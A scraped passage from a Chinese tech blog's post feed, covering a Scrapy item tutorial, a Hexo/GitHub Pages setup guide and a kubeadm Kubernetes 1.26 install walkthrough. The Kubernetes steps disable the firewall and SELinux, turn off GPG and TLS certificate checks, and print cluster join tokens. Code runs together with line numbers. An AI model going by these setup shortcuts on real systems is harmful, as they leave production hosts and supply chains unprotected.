你把它改了. 管道就断了 def process_item(self, item, spider): print(item) return item 六, 自定义数据传输结构item​ 在上述案例中, 我们使用字典作为数据传递的载体, 但是如果数据量非常大. 由于字典的key是随意创建的. 极易出现问题, 此时再用字典就不合适了. Scrapy中提供item作为数据格式的声明位置. 我们可以在items.py文件提前定义好该爬虫在进行数据传输时的数据格式. 然后再写代码的时候就有了数据名称的依据了. item.py文件 1234567import scrapyclass GameItem(scrapy.Item): # 定义数据结构 name = scrapy.Field() category = scrapy.Field() date = scrapy.Field() spider中. 这样来使用: 12345678from mySpider_2.items import GameItem# 以下代码在spider中的parse替换掉原来的字典item = GameItem()item[&quot;name&quot;] = nameitem[&quot;category&quot;] = categoryitem[&quot;date&quot;] = dateyield item 七, scrapy使用小总结至此, 我们对scrapy有了一个非常初步的了解和使用. 快速总结一下. scrapy框架的使用流程: 创建爬虫项目. scrapy startproject xxx 进入项目目录. cd xxx 创建爬虫 scrapy genspider 名称 抓取域 编写item.py 文件, 定义好数据item 修改spider中的parse方法. 对返回的响应response对象进行解析. 返回item 在pipeline中对数据进行保存工作. 修改settings.py文件, 将pipeline设置为生效, 并设置好优先级 启动爬虫 scrapy crawl 名称","categories":[{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"}]},{"title":"搭建github博客教程","slug":"搭建github博客教程","date":"2023-12-03T03:47:04.000Z","updated":"2023-12-03T03:52:10.585Z","comments":true,"path":"2023/12/03/搭建github博客教程/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/%E6%90%AD%E5%BB%BAgithub%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/","excerpt":"","text":"【2023最新版】Hexo+github搭建个人博客并绑定个人域名Hexo+github搭建个人博客并绑定个人域名安装并配置Node.jsNode.js下载:【它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。】 教程：https://blog.csdn.net/weixin\\_52799373/article/details/123840137（过程详细，还覆盖win11，评论下面还有师叔的足迹） 注意一 全局安装最常用的 express 模块 进行测试命令如下: 1npm install express -g 报错图片： 解决方法： 【亲测有效】 需要删除 npmrc 文件。 **强调：**不是nodejs安装目录npm模块下的那个npmrc文件 而是在 C:\\Users\\（你的用户名）\\下的.npmrc文件 聪明的你，一定想到了直接用evering搜索，省的还要调用文件管理器在一点一点的找 注意二 在文章第四歩测试上查看安装结果 可能会出现下面照片结果，更改了目录为什么还是C盘目录下，这时候只需要以管理员身份运行命令即可。 在下面路径下找到cmd.exe并且管理员身份运行即可。 推测：出像这种现象的原因就是执行权限不够，推荐大家在桌面建立一个快捷方式（管理员命令的）cmd 1C:\\Windows\\System32\\cmd.exe 创建管理员权限的cmd桌面快捷方式 安装并配置Gitgit是一个并源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理 Windows系统Git安装教程：https://www.cnblogs.com/xueweisuoyong/p/11914045.html 生成SSH Keys生成ssh 1ssh-keygen -t rsa -C &quot;你的邮箱地址&quot; 找到秘钥位置并复制 测试ssh是否绑定成功 1ssh -T git@github.com 如果问你（yes or no）,直接 yes 就可以得到下面这段话 本地访问博客1、创建一个名为 Blog 的文件，在里面启用 Git Bash Here 2、初始化hexo 1hexo init 3、生成本地的hexo页面 1hexo s 4、访问 打开本地服务区 1http://localhost:4000/ 长按 Ctrl + c 关闭服务器 上传到Github修改-config.yml文件 把图片上位置更换成 1deploy: type: git repository: 你的github地址 branch: main 安装hexo-deployer-git 自动部署发布工具 1npm install hexo-deployer-git --save 生成页面 1hexo g 注意一 如果报错如下：（无报错，请忽略此条） 报错信息是提示hexo的yml配置文件 冒号后面少了空格解决方案：到提示行将对应的空格补上即可 本地文件上传到Github上面 1hexo d 中间会出现一个登录界面，可以用令牌登录。（令牌及时保存，就看不到了） 结束以后就上传 Github 就成功了！！！ 注意二 如果出现如图错误网络报错，再次尝试，多次尝试，直到更换WiFi~~~~ 访问GitHub博客 访问博客，开始的页面是初始化页面，没有做美化和增加内容。 1https://wushishu.github.io/ 第二部分 文档学习撰写博客电脑要必须有Typora！电脑要必须有Typora！电脑要必须有Typora！（重要的事情说三遍） 文本教程：https://dhndzwxj.vercel.app/3276806131.html hexo标签教程：http://haiyong.site/post/cda958f2.html（参考文档看需求加不加） 我们打开自己的博客根目录，跟着我一个个了解里面的这些文件（夹）都是干什么的： _config.yml：俗称站点配置文件，很多与博客网站的格式、内容相关的设置都需要在里面改。 node_modules:存储Hexo插件的文件，可以实现各种扩展功能。一般不需要管。 package.json：别问我，我也不知道干嘛的。 scaffolds：模板文件夹，里面的post.md文件可以设置每一篇博客的模板。具体用起来就知道能干嘛了。 source：非常重要。所有的个人文件都在里面！ themes：主题文件夹，可以从Hexo主题官网或者网上大神的Github主页下载各种各样美观的主题，让自己的网站变得逼格高端的关键！ 接下来重点介绍source文件夹。新建的博客中，source文件夹下默认只有一个子文件夹——_posts。我们写的博客都放在这个子文件夹里面。我们还可以在source里面新建各种子文件夹满足自己的个性化需求，对初学者而言，我们先把精力放在主线任务上，然后再来搞这些细节。 hexo官方文档：https://hexo.io/zh-cn/docs/commands.html 写好内容后，在命令行一键三连： ‘hexo cl’命令用于清除缓存文件（db.json）和已生成的静态文件（public）。 例如：在更换主题后，如果发现站点更改不生效，可以运行该命令。 1hexo cl 1hexo g 1hexo s 然后随便打开一个浏览器，在网址栏输入localhost:4000/，就能发现自己的网站更新了！不过这只是在本地进行了更新，要想部署到网上（Github上），输入如下代码： 1hexo d 然后在浏览器地址栏输入https://yourname.github.io，或者yourname.github.io就能在网上浏览自己的博客了！ 以上，我们的博客网站1.0版本就搭建完成了，如果没有更多的需求，做到这里基本上就可以了。如果有更多的要求，还需要进一步的精耕细作！ 精耕细作**海拥\\Butterfly 主题美化：**http://haiyong.site/post/22e1d5da.html Butterfly参考文档（小白慎入，但是他也是你走向DIY必须迈出的一歩）:https://butterfly.js.org/posts/dc584b87/#Post-Front-matter 文章中要更改的文件（.yml .bug 等）可以要用viscode打开！！！ Butterfly 主题安装 1git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly 这里面如果报错，如下图所示（长路漫漫，bug满满） 只需要在命令行中执行 1git config --global --unset http.proxy git config --global --unset https.proxy 再次安装主题即可成功 应用主题 1theme: butterfly 安装插件 如果你没有 pug 以及 stylus 的渲染器，请下载安装： 1npm install hexo-renderer-pug hexo-renderer-stylus --save Butterfly 主题美化生成文章唯一链接 Hexo的默认文章链接格式是年，月，日，标题这种格式来生成的。如果你的标题是中文的话，那你的URL链接就会包含中文， 复制后的URL路径就是把中文变成了一大堆字符串编码，如果你在其他地方用这边文章的url链接，偶然你又修改了改文章的标题，那这个URL链接就会失效。为了给每一篇文章来上一个属于自己的链接，写下此教程，利用 hexo-abbrlink 插件，A Hexo plugin to generate static post link based on post titles ,来解决这个问题。 参考github官方： hexo-abbrlink 按照此教程配置完之后如下： 1、安装插件，在博客根目录 [Blogroot] 下打开终端，运行以下指令： 1npm install hexo-abbrlink --save 2、插件安装成功后，在根目录 [Blogroot] 的配置文件 _config.yml 找到 permalink： 发布博客这次了解我上面只有一个HelloWord的时候，为什么不让右键新建，因为需要命令生成啊，铁汁！ 1npm i hexo-deployer-git 1hexo new post &quot;新建博客文章名&quot; 1hexo cl &amp;&amp; hexo g &amp;&amp; hexo s hexo更换背景图片背景图片参考网址： https://wallhaven.cc/ https://wall.alphacoders.com/ https://bz.zzzmh.cn/index 本方法解决的是多次同步到GitHub上背景图片未成功的情况 直接更改原文件 图片所在目录：hexo/themes/landscape/source/css/images/ 图片名称：banner.jpg 第三部分 绑定自己的域名博客地址：https://www.likecs.com/show-30474.html 绑定之后你就有有一个自己专属的博客了。 买一个域名，可以一块钱白嫖，但是续费贵的飞天！！！ 注意请谨慎绑定，想我就会出现提交一次 (hexo d) ,需要重新绑定域名 声明：如果遇到什么不懂的可以先百度，在不懂可以微信我wushibo0820 问题：解决&#103;&#x69;&#x74;&#x40;&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#111;&#109;: Permission denied (publickey). fatal: Could not read from remote repository. Pleas 一:原因分析Permission denied (publickey) 没有权限的publickey ，出现这错误一般是以下两种原因 客户端与服务端未生成 ssh key 客户端与服务端的ssh key不匹配 找到问题的原因了，解决办法也就有了，重新生成一次ssh key ，服务端也重新配置一次即可。 二:客户端生成ssh key在cmd里面输入 ssh-keygen -t rsa -C “&#x78;&#x78;&#120;&#x78;&#120;&#120;&#120;&#x78;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;“ 1ssh-keygen -t rsa -C &quot;youremail@example.com&quot; xxxxxx@qq.com改为自己的邮箱即可，途中会让你输入密码啥的，不需要管，一路回车即可，会生成你的ssh key。（如果重新生成的话会覆盖之前的ssh key。） 三:输入箭头处路径 四:打开id_rsa.pub文件,并且复制内容 配置服务端五:在github上打开箭头处,点击Setting 六:点击SSH and GPG keys 七:打开你刚刚生成的id_rsa.pub，将里面的内容复制，进入你的github账号，在settings下，SSH and GPG keys下new SSH key，然后将id_rsa.pub里的内容复制到Key中，完成后Add SSH Key。 八:然后添加后入下图所示 九:用idea再次提交文件到 github上,显示提交成功","categories":[{"name":"杂类学习","slug":"杂类学习","permalink":"http://blog.ioimp.top/categories/%E6%9D%82%E7%B1%BB%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"博客搭建教程","slug":"博客搭建教程","permalink":"http://blog.ioimp.top/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"}]},{"title":"kubernetes核心概念","slug":"kubernetes核心概念","date":"2023-11-24T00:29:53.000Z","updated":"2023-11-24T00:35:24.630Z","comments":true,"path":"2023/11/24/kubernetes核心概念/","link":"","permalink":"http://blog.ioimp.top/2023/11/24/kubernetes%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5/","excerpt":"","text":"01-kubernetes核心概念1 有了docker 什么要用kubernetes 2 多容器跨主机提供服务 3 多容器分布节点部署 4 多容器的升级 5 高效管理容器 docker管理工具 Docker compose, docker machine, docker swarm 常见的容器编排工具： kubernetes google伯格系统 swarm 2018已经被docker废弃 mesos marathon 容器编排组件 02-kubernetes是什么Kubernetes 是一个开源的容器编排引擎，用来对容器化应用进行自动化部署、 扩缩和管理。该项目托管在 CNCF。 kubernetes是google 2014年开源的一个容器集群管理系统。简称k8s Kubernetes 用于容器化应用程序的部署 官网 https://kubernetes.io/zh/ 03-kubernetes架构与组件master 管理节点（管理集群） Kubectl 管理工具 Api server,scheduler, conttroller manager，etcd分布式键值存储数据库 API Server：所有服务访问的唯一入口，提供认证、授权、访问控制、API 注册和发现等机制 Scheduler：负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上 Controller Manager：负责维护集群的状态，比如副本期望数量、故障检测、自动扩展、滚动更新等 etcd：键值对数据库，保存了整个集群的状态 Node 工作节点（运行应用） Kubelet 代理 负责维护容器的生命周期，同时也负责 Volume 和网络的管理 kubelet的主要功能就是定时从node上获取 pod&#x2F;container 的期望状态。并负责管理pod和它们上面的容器，如images镜像、volumes、etc并确保这些Pod正常运行，能实时返回Pod的运行状态。 注意 在kubernetes 的设计中，最基本的管理单位是 pod，而不是 container。pod 是 kubernetes 在容器上的一层封装，由一组运行在同一主机的一个或者多个容器组成。 Kube-proxy 负责为 Service 提供 cluster 内部的服务发现和负载均衡 kube-proxy的作用主要是负责service的实现，具体来说，就是实现了内部从pod到service和外部的从node port向service的访问，其实就是pod的网络代理 Container runtime： 负责镜像管理以及 Pod 和容器的真正运行 除了核心组件，还有一些推荐的插件：CoreDNS：可以为集群中的 SVC 创建一个域名 IP 的对应关系解析的 DNS 服务Dashboard：为Kubernetes 集群提供了一个 B&#x2F;S 架构的访问入口Ingress Controller：官方只能够实现四层的网络代理，而 Ingress 可以实现七层的代理Prometheus：给 Kubernetes 集群提供资源监控的能力Federation： 提供一个可以跨集群中心多 Kubernetes 的统一管理功能，提供跨可用区的集群 05-kubernetes各个组件调用关系master：集群的控制平面，负责集群的决策 ( 管理 )ApiServer : 资源操作的唯一入口，接收用户输入的命令，提供认证、授权、API注册和发现等机制Scheduler : 负责集群资源调度，按照预定的调度策略将Pod调度到相应的node节点上ControllerManager : 负责维护集群的状态，比如程序部署安排、故障检测、自动扩展、滚动更新等Etcd ：负责存储集群中各种资源对象的信息 node：集群的数据平面，负责为容器提供运行环境 ( 干活 )Kubelet : 负责维护容器的生命周期，即通过控制docker，来创建、更新、销毁容器KubeProxy : 负责提供集群内部的服务发现和负载均衡Docker : 负责节点上容器的各种操作 下面，以部署一个nginx服务来说明kubernetes系统各个组件调用关系：kubernetes环境启动之后，master和node都会将自身的信息存储到etcd数据库中，一个nginx服务的安装请求会首先被发送到master节点的apiServer组件,apiServer组件会调用scheduler组件来决定到底应该把这个服务安装到哪个node节点上,此时它会从etcd中读取各个node节点的信息，然后按照特定的算法进行选择，并将结果告知apiServer，apiServer调用controller-manager去调度Node节点安装nginx服务，kubelet接收到指令后，会通知docker，然后由docker来启动一个nginx的pod，pod是kubernetes的最小操作单元，容器必须跑在pod中至此，一个nginx服务就运行了，如果需要访问nginx，就需要通过kube-proxy来对pod产生访问的代理。这样外界用户就可以访问集群中的nginx服务了 05-kubernetes概念Master：集群控制节点，每个集群需要至少一个master节点负责集群的管控Node：工作负载节点，由master分配容器到这些node工作节点上，然后node节点上的docker负责容器的运行Pod：kubernetes的最小控制单元，容器都是运行在pod中的，一个pod中可以有1个或者多个容器Controller：控制器，通过它来实现对pod的管理，比如启动pod、停止pod、伸缩pod的数量等等Service：pod对外服务的统一入口，下面可以维护者同一类的多个podLabel：标签，用于对pod进行分类，同一类pod会拥有相同的标签NameSpace：命名空间，用来隔离pod的运行环境 06-kubernetes集群架构官方文档 概念 和任务。 官网 https://kubernetes.io/zh/ k8s的部署方式： minikube：一个用于快速搭建单节点kubernetes的工具，minikube顾名思义即迷你型Kubernetes，非常适合快速学习k8s的各个组件的作用及yml的编写。 Kubeadm 部署 ：官方提供的一个用于快速搭建kubernetes集群的工具 https://kubernetes.io/docs/reference/setup-tools/kubeadm/kubeadm/ 二进制部署 ： 从官网下载每个组件的二进制包，依次去安装，此方式对于理解kubernetes组件更加有效 https://github.com/kubernetes/kubernetes 第三方工具部署： rancher webui k8s服务器硬件配置： kubernetes集群大体上分为两类：一主多从和多住多从 一主多从：一台master节点和多台node节点，搭建简单，但是有单机故障风险，适用于测试环境 多主多从：多台master节点和多台node节点，搭建相对负载，安全性高，适用于生产环境 07-kubeadm快速部署k8s第一步首先安装 Linux ubuntu18.04 ubuntu下载地址：http://cdimage.ubuntu.com/releases/ Ubuntu18.04设置国内源 阿里源 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 中科大源 12345678910deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse 网易源 12345678910deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse 清华源 12345678910deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse 第二步： 安装docker 第三步: 安装对应版本的kubeadm工具 第四步： 初始k8s集群 第五步： 安装k8s网络插件 08-部署k8s v1.26版本8.1 系统环境准备12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091921.1 安装所需工具yum -y install vimyum -y install wget# 设置yum源mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backupwget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo1.2 修改主机名#masterhostnamectl set-hostname master-01#node1hostnamectl set-hostname node-01#node2hostnamectl set-hostname node-021.3 编辑hosts[root@localhost ~]# vim /etc/hosts# 增加以下内容192.168.31.249 master-01192.168.31.250 node-01192.168.31.251 node-021.4 安装ntpdate并同步时间yum -y install ntpdatentpdate ntp1.aliyun.com1.5 安装并配置 bash-completion，添加命令自动补充yum -y install bash-completionsource /etc/profile1.6 关闭防火墙systemctl stop firewalld.service systemctl disable firewalld.service1.7 关闭selinuxsed -i &#x27;s/enforcing/disabled/&#x27; /etc/selinux/config # 永久关闭1.8 关闭 swapfree -hsudo swapoff -asudo sed -i &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstabfree -h二：安装k8s 1.26.x2.1 安装 Containerdyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo sudo yum install -y containerd.iosystemctl stop containerd.servicecp /etc/containerd/config.toml /etc/containerd/config.toml.baksudo containerd config default &gt; $HOME/config.tomlsudo cp $HOME/config.toml /etc/containerd/config.toml# 修改 /etc/containerd/config.toml 文件后，要将 docker、containerd 停止后，再启动sudo sed -i &quot;s#registry.k8s.io/pause#registry.cn-hangzhou.aliyuncs.com/google_containers/pause#g&quot; /etc/containerd/config.toml# https://kubernetes.io/zh-cn/docs/setup/production-environment/container-runtimes/#containerd-systemd# 确保 /etc/containerd/config.toml 中的 disabled_plugins 内不存在 crisudo sed -i &quot;s#SystemdCgroup = false#SystemdCgroup = true#g&quot; /etc/containerd/config.toml#启动containerdsystemctl start containerd.servicesystemctl status containerd.service2.2 添加阿里云 k8s 镜像仓库cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/# 是否开启本仓库enabled=1# 是否检查 gpg 签名文件gpgcheck=0# 是否检查 gpg 签名文件repo_gpgcheck=0gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF2.3 将桥接的 IPv4 流量传递到 iptables 的链# 设置所需的 sysctl 参数，参数在重新启动后保持不变cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-iptables = 1net.bridge.bridge-nf-call-ip6tables = 1net.ipv4.ip_forward = 1EOF# 应用 sysctl 参数而不重新启动sudo sysctl --system# 启动br_netfiltermodprobe br_netfilterecho 1 &gt; /proc/sys/net/ipv4/ip_forward2.4 安装k8s# 2023-03-02，经过测试，版本号：1.26.2，yum install -y kubelet-1.26.3-0 kubeadm-1.26.3-0 kubectl-1.26.3-0 --disableexcludes=kubernetes --nogpgchecksystemctl daemon-reloadsystemctl restart kubeletsystemctl enable kubelet 8.2 初始化master集群123456789101112131415161718192021222324252627282930313233343536373839404142434445如需订制版本安装：需获取镜像文件,查看需要的镜像kubeadm config images list系统输出:[root@master-01 ~]# kubeadm config images listI1122 10:13:55.024056 66494 version.go:256] remote version is much newer: v1.28.4; falling back to: stable-1.26registry.k8s.io/kube-apiserver:v1.26.11registry.k8s.io/kube-controller-manager:v1.26.11registry.k8s.io/kube-scheduler:v1.26.11registry.k8s.io/kube-proxy:v1.26.11registry.k8s.io/pause:3.9registry.k8s.io/etcd:3.5.6-0registry.k8s.io/coredns/coredns:v1.9.3[root@master-01 ~]# 编辑一个文件, 命名为： install_k8s_images.shvim install_k8s_images.sh#! /bin/bashimages=( kube-apiserver:v1.26.11 kube-controller-manager:v1.26.11 kube-scheduler:v1.26.11 kube-proxy:v1.26.11 pause:3.9 etcd:3.5.6-0 coredns:1.9.3)for imageName in $&#123;images[@]&#125; ; do docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageNamedone将文件设置为可运行：chmod a+x install_k8s_images.sh运行 install_k8s_images.sh 安装所需要的镜像./install_k8s_images.sh注意：以上步骤需要在Master和work机器完成 通过kubeadm命令初始化master集群 –kubernetes-version: 用于指定k8s版本；–apiserver-advertise-address：用于指定kube-apiserver监听的ip地址,就是 master本机IP地址。–pod-network-cidr：用于指定Pod的网络范围； 10.244.0.0&#x2F;16–service-cidr：用于指定SVC的网络范围；–image-repository: 指定阿里云镜像仓库地址 1kubeadm init --kubernetes-version=v1.26.11 --apiserver-advertise-address=0.0.0.0 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.26.11 --pod-network-cidr=10.244.0.0/16 8.2.1配置集群配置文件 1234567891011mkdir -p $HOME/.kubecp -i /etc/kubernetes/admin.conf $HOME/.kube/configchown $(id -u):$(id -g) $HOME/.kube/config设置配置文件变量export KUBECONFIG=/etc/kubernetes/admin.confecho export KUBECONFIG=/etc/kubernetes/admin.conf &gt;&gt; /etc/profilesource /etc/profile 8.2.2 各个工作节点，执行如下命令将工作节点加入集群 1kubeadm join 192.168.31.249:6443 --token f1226v.yjwsbpyrjs9oojmc --discovery-token-ca-cert-hash sha256:34220ce3bb6d29429afa0b1c6505ff14cc1aee7373a9b973904abd592aec3b3c 查看加入集群的工作节点与token 12345678910[root@master-01 ~]# kubeadm token create --print-join-commandkubeadm join 192.168.31.249:6443 --token ojjtbl.lkchb9823sltuhwn --discovery-token-ca-cert-hash sha256:34220ce3bb6d29429afa0b1c6505ff14cc1aee7373a9b973904abd592aec3b3c [root@master-01 ~]# kubectl get nodeNAME STATUS ROLES AGE VERSIONmaster-01 NotReady control-plane 20m v1.26.3node-01 NotReady &lt;none&gt; 15m v1.26.3node-02 NotReady &lt;none&gt; 9m37s v1.26.3[root@master-01 ~]# 8.2.3 配置k8s网络 123456789101112131415161718192021222324252627282930 maste节点配置网络,使用Calico# 下载wget --no-check-certificate https://projectcalico.docs.tigera.io/archive/v3.25/manifests/calico.yaml# 修改 calico.yaml 文件vim calico.yaml# 在 - name: CLUSTER_TYPE 下方添加如下内容- name: CLUSTER_TYPE value: &quot;k8s,bgp&quot; # 下方为新增内容- name: IP_AUTODETECTION_METHOD value: &quot;interface=网卡名称&quot; # INTERFACE_NAME=ens33 设置pod网络为10.244.0.0/16 与前面初始步骤一致- name: CALICO_IPV4POOL_CIDR value: &quot;10.244.0.0/16&quot;kubeadm 支持多种网络插件，我们选择 Calico 网络插件（kubeadm 仅支持基于容器网络接口（CNI）的网络（不支持kubenet）。），默认情况下，它给出的pod的IP段地址是 192.168.0.0/16 ,如果你的机器已经使用了此IP段，就需要修改这个配置项，将其值改为在初始化 Master 节点时使用 kubeadm init –pod-network-cidr=x.x.x.x/x 的IP地址段然后在部署 Pod 网络组件，当然对于现在的网络环境来说这些都不是必须的kubectl apply -f calico.yaml 稍等片刻查询 pod 详情，你也可以使用 watch 命令来实时查看 pod 的状态，等待 Pod 网络组件部署成功后，就可以看到一些信息了，包括 Pod 的 IP 地址信息，这个过程时间可能会有点长。 kubectl get pods -n &lt;namespace&gt; --watch可以通过Ctrl+C终止这个Watch模式查看日志命令用于拍错journalctl -xefu kubelet 8.3 kubelet启用lvs负载12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091安装ipvsadmyum install -y ipvsadm手动载入如下模块modprobe ip_vsmodprobe ip_vs_rrmodprobe ip_vs_wrrmodprobe ip_vs_sh确认ipvs模块以及载入root@manager:~# lsmod|grep ip_vsip_vs_sh 16384 0ip_vs_wrr 16384 0ip_vs_rr 16384 12ip_vs 172032 18 ip_vs_rr,ip_vs_sh,ip_vs_wrrnf_conntrack 172032 7 xt_conntrack,nf_nat,nf_nat_ipv6,ipt_MASQUERADE,nf_nat_ipv4,nf_conntrack_netlink,ip_vsnf_defrag_ipv6 20480 2 nf_conntrack,ip_vslibcrc32c 16384 4 nf_conntrack,nf_nat,xfs,ip_vs否则要自己构建模块载入配置文件 并设置权限,以下是debian10的配置实例echo &gt; /etc/systemd/system/kubelet.service.d/10-proxy-ipvs.conf &lt;&lt;-&#x27;EOF&#x27;#!/bin/bashmodprobe -- ip_vsmodprobe -- ip_vs_rrmodprobe -- ip_vs_wrrmodprobe -- ip_vs_shmodprobe -- nf_conntrackmodprobe -- br_netfilterEOFchmod +x /etc/systemd/system/kubelet.service.d/10-proxy-ipvs.conf 本例是cenntos配置实例cat &gt; /usr/lib/systemd/system/kubelet.service.d/10-proxy-ipvs.conf &lt;&lt; &#x27;EOF&#x27;[Service]ExecStartPre=-modprobe ip_vsExecStartPre=-modprobe ip_vs_rrExecStartPre=-modprobe ip_vs_wrrExecStartPre=-modprobe ip_vs_shEOFchmod +x /usr/lib/systemd/system/kubelet.service.d/10-proxy-ipvs.confscp /usr/lib/systemd/system/kubelet.service.d/10-proxy-ipvs.conf root@192.168.3.166:/usr/lib/systemd/system/kubelet.service.d/10-proxy-ipvs.confscp /usr/lib/systemd/system/kubelet.service.d/10-proxy-ipvs.conf root@192.168.3.167:/usr/lib/systemd/system/kubelet.service.d/10-proxy-ipvs.conf更改kube-proxy配置kubectl edit configmap kube-proxy -n kube-system找到如下部分的内容41行左右。 minSyncPeriod: 0s scheduler: &quot;&quot; syncPeriod: 30s kind: KubeProxyConfiguration metricsBindAddress: 127.0.0.1:10249 mode: &quot;ipvs&quot; # 加上这个 nodePortAddresses: null其中mode原来是空，默认为iptables模式，改为ipvs保存退出scheduler默认是空，默认负载均衡算法为轮训重启验证： kubectl logs -n kube-system -f kube-proxy-8kzr2 #(8kzr2为ID)I1122 06:58:15.474822 1 node.go:136] Successfully retrieved node IP: 192.168.3.167I1122 06:58:15.474933 1 server_others.go:111] kube-proxy node IP is an IPv4 address (192.168.3.167), assume IPv4 operationI1122 06:58:15.847846 1 server_others.go:259] Using ipvs Proxier.W1122 06:58:15.848556 1 proxier.go:434] IPVS scheduler not specified, use rr by defaultI1122 06:58:15.848926 1 server.go:650] Version: v1.19.2I1122 06:58:15.849742 1 conntrack.go:100] Set sysctl &#x27;net/netfilter/nf_conntrack_max ipvsadm -ln #查看ipvsadm规则[root@master-01 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 10.96.0.1:443 rr -&gt; 192.168.31.249:6443 Masq 1 4 0 TCP 10.96.0.10:53 rr -&gt; 10.244.184.4:53 Masq 1 0 0 -&gt; 10.244.184.5:53 Masq 1 0 0 TCP 10.96.0.10:9153 rr -&gt; 10.244.184.4:9153 Masq 1 0 0 -&gt; 10.244.184.5:9153 Masq 1 0 0 UDP 10.96.0.10:53 rr -&gt; 10.244.184.4:53 Masq 1 0 0 -&gt; 10.244.184.5:53 Masq 1 0 0 [root@master-01 ~]# 8.4 kubectl 命令补全1234yum install -y bash-completionsource &lt;(kubectl completion bash)echo &quot;source &lt;(kubectl completion 